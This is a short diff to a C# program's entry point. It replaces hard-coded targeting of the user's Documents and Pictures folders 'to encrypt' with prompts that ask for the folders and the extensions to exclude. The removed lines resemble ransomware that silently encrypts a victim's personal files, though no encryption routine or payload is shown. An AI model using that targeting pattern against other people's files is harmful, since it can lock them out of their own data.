@@ -183,13 +183,13 @@ class Program
 
     static void Main()
     {
-        string userFolderPath = Environment.GetEnvironmentVariable("USERPROFILE"); // root folder
-        List<string> foldersToEncrypt = new List<string>
-        {
-            Path.Combine(userFolderPath, "Documents"), // folders to encrypt, more can be added
-            Path.Combine(userFolderPath, "Pictures")
-        };
-        List<string> excludedExtensions = new List<string> { ".cs", ".exe", ".js" }; // Example excluded extensions
+        Console.WriteLine("Enter the folders to encrypt, separated by comma:");
+        string[] foldersInput = Console.ReadLine().Split(',');
+        List<string> foldersToEncrypt = foldersInput.Select(folder => folder.Trim()).ToList();
+
+        Console.WriteLine("Enter the extensions to exclude, separated by comma (e.g. .cs,.exe,.js):");
+        string[] extensionsInput = Console.ReadLine().Split(',');
+        List<string> excludedExtensions = extensionsInput.Select(ext => ext.Trim()).ToList();
 
         bool isEncrypted = foldersToEncrypt.Any(folderPath => IsFolderEncrypted(folderPath, excludedExtensions));
 
